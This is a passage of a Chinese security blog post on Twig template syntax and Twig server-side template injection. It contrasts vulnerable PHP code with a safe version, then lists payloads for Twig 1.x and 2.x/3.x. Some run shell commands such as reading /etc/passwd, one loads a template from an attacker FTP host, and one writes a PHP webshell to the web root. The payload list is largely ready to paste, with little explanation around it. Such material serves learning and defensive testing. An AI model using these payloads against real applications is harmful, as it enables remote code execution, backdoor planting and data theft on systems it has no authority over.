+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span> item<span class="token punctuation">.</span>href <span class="token delimiter punctuation">&#125;&#125;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span> item<span class="token punctuation">.</span>caption <span class="token delimiter punctuation">&#125;&#125;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag-name keyword">endfor</span> <span class="token delimiter punctuation">%&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'navigation'</span> <span class="token operator">=></span> <span class="token punctuation">[</span>
+        <span class="token punctuation">[</span><span class="token string single-quoted-string">'href'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'/home'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'caption'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Home'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token punctuation">[</span><span class="token string single-quoted-string">'href'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'/about'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'caption'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'About'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token punctuation">[</span><span class="token string single-quoted-string">'href'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'/contact'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'caption'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Contact'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><code>&#123;	# ...#	&#125;</code>不多解释</p>
+<hr>
+<h2 id="引入其他模板"><a href="#引入其他模板" class="headerlink" title="引入其他模板"></a>引入其他模板</h2><pre class="line-numbers language-twig" data-language="twig"><code class="language-twig"><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span> include<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">'</span>sidebar.html<span class="token punctuation">'</span></span><span class="token punctuation">)</span> <span class="token delimiter punctuation">&#125;&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h2><p>Twig最强大的地方，但我暂时用不到就不想写，毕竟我自己博客是ejs模板（</p>
+<hr>
+<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>和其他的模板注入一样，Twig 模板注入也是发生在直接将用户输入作为模板，如下</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">require_once</span> <span class="token constant">__DIR__</span><span class="token operator">.</span><span class="token string single-quoted-string">'/vendor/autoload.php'</span><span class="token punctuation">;</span>
+
+<span class="token variable">$loader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Twig<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>ArrayLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$twig</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Twig<span class="token punctuation">\</span>Environment</span><span class="token punctuation">(</span><span class="token variable">$loader</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$template</span> <span class="token operator">=</span> <span class="token variable">$twig</span><span class="token operator">-></span><span class="token function">createTemplate</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hello <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token variable">$template</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>很明显在<code>createTemplate</code> 时注入了 <code>$_GET[&#39;name&#39;]</code></p>
+<p><img src="/blog/2024/01/10/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240110154614955.png" alt="image-20240110154614955"></p>
+<p>所以正确的写法应该是下面这样：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">require_once</span> <span class="token constant">__DIR__</span><span class="token operator">.</span><span class="token string single-quoted-string">'/vendor/autoload.php'</span><span class="token punctuation">;</span>
+
+<span class="token variable">$loader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Twig<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>ArrayLoader</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
+    <span class="token string single-quoted-string">'index'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Hello &#123;&#123; name &#125;&#125;!'</span><span class="token punctuation">,</span>
+<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$twig</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Twig<span class="token punctuation">\</span>Environment</span><span class="token punctuation">(</span><span class="token variable">$loader</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token variable">$twig</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span> <span class="token operator">=></span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2024/01/10/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240110154805070.png" alt="image-20240110154805070"></p>
+<h2 id="1-x"><a href="#1-x" class="headerlink" title="1.x"></a>1.x</h2><p>依旧是在PHP7.3.4配置的twig1.0</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token keyword">require_once</span> <span class="token string single-quoted-string">'vendor/autoload.php'</span><span class="token punctuation">;</span>
+
+<span class="token variable">$loader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Twig_Loader_String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$twig</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Twig_Environment</span><span class="token punctuation">(</span><span class="token variable">$loader</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$twig</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在 Twig 1.x 中存在三个全局变量：</p>
+<ul>
+<li><code>_self</code>：引用当前模板的实例</li>
+<li><code>_context</code>：引用当前上下文</li>
+<li><code>_charset</code>：引用当前字符集</li>
+</ul>
+<p>对应的代码是：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token variable">$specialVars</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
+        <span class="token string single-quoted-string">'_self'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'$this'</span><span class="token punctuation">,</span>
+        <span class="token string single-quoted-string">'_context'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'$context'</span><span class="token punctuation">,</span>
+        <span class="token string single-quoted-string">'_charset'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'$this->env->getCharset()'</span><span class="token punctuation">,</span>
+    <span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里主要就是利用 <code>_self</code> 变量，它会返回当前 <code>\Twig\Template</code> 实例，并提供了指向 <code>Twig_Environment</code> 的 <code>env</code> 属性，这样我们就可以继续调用 <code>Twig_Environment</code> 中的其他方法，从而进行 SSTI。</p>
+<p>payload：</p>
+<ul>
+<li><p>命令执行</p>
+<p>在 <code>getFilter</code> 中有 <code>call_user_func</code>，传参进去实现命令执行</p>
+<pre class="line-numbers language-twig" data-language="twig"><code class="language-twig"><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span>_self<span class="token punctuation">.</span>env<span class="token punctuation">.</span>registerUndefinedFilterCallback<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span>_self<span class="token punctuation">.</span>env<span class="token punctuation">.</span>getFilter<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>cat /etc/passwd<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>也可以用下面这个</p>
+<pre class="line-numbers language-twig" data-language="twig"><code class="language-twig"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">ex</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>freemarker.template.utility.Execute<span class="token punctuation">"</span></span><span class="token attr-name">?new()</span><span class="token punctuation">></span></span> $&#123; ex("cat /etc/passwd") &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>远程文件包含</p>
+<p>调用 <code>setCache</code> 方法改变 Twig 加载 PHP 文件的路径，在 <code>allow_url_include</code> 开启的情况下我们可以改变路径实现RFI</p>
+<pre class="line-numbers language-twig" data-language="twig"><code class="language-twig"><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span>_self<span class="token punctuation">.</span>env<span class="token punctuation">.</span>setCache<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>ftp://attacker.net:2121<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span>_self<span class="token punctuation">.</span>env<span class="token punctuation">.</span>loadTemplate<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>backdoor<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ul>
+<hr>
+<h2 id="2-x-amp-3-x"><a href="#2-x-amp-3-x" class="headerlink" title="2.x&amp;3.x"></a>2.x&amp;3.x</h2><p>Twig 2.x 及 Twig 3.x 以后，<code>_self</code> 的作用发生了变化，只能返回当前实例名字符串</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">require_once</span> <span class="token constant">__DIR__</span><span class="token operator">.</span><span class="token string single-quoted-string">'/vendor/autoload.php'</span><span class="token punctuation">;</span>
+
+<span class="token variable">$loader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Twig<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>ArrayLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$twig</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Twig<span class="token punctuation">\</span>Environment</span><span class="token punctuation">(</span><span class="token variable">$loader</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$template</span> <span class="token operator">=</span> <span class="token variable">$twig</span><span class="token operator">-></span><span class="token function">createTemplate</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hello <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token variable">$template</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>先上payload，有时间再补流程：</p>
+<pre class="line-numbers language-twig" data-language="twig"><code class="language-twig"><span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span><span class="token punctuation">[</span><span class="token string"><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">]</span><span class="token operator">|</span>map<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>system<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span>
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span><span class="token punctuation">[</span><span class="token string"><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">]</span><span class="token operator">|</span>map<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>passthru<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span>
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span><span class="token punctuation">[</span><span class="token string"><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">]</span><span class="token operator">|</span>map<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span>    // 无回显
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span><span class="token punctuation">[</span><span class="token string"><span class="token punctuation">"</span>phpinfo();<span class="token punctuation">"</span></span><span class="token punctuation">]</span><span class="token operator">|</span>map<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>assert<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>,<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span>
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span><span class="token punctuation">&#123;</span><span class="token string"><span class="token punctuation">"</span>&lt;?php phpinfo();eval($_POST[cmd])<span class="token punctuation">"</span></span><span class="token punctuation">:</span><span class="token string"><span class="token punctuation">"</span>/var/www/html/shell.php<span class="token punctuation">"</span></span><span class="token punctuation">&#125;</span><span class="token operator">|</span>map<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>file_put_contents<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span>    // 写 Webshell
+
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span><span class="token punctuation">[</span><span class="token string"><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">|</span>sort<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>system<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span>
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span><span class="token punctuation">[</span><span class="token string"><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">|</span>sort<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>passthru<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span>
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span><span class="token punctuation">[</span><span class="token string"><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">|</span>sort<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span>    // 无回显
+
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">|</span>reduce<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>system<span class="token punctuation">"</span></span><span class="token punctuation">,</span> <span class="token string"><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span>
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">|</span>reduce<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>passthru<span class="token punctuation">"</span></span><span class="token punctuation">,</span> <span class="token string"><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span>
+<span class="token twig language-twig"><span class="token delimiter punctuation">&#123;&#123;</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">|</span>reduce<span class="token punctuation">(</span><span class="token string"><span class="token punctuation">"</span>exec<span class="token punctuation">"</span></span><span class="token punctuation">,</span> <span class="token string"><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span>    // 无回显<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2024/01/10/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240110162651612.png" alt="image-20240110162651612"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
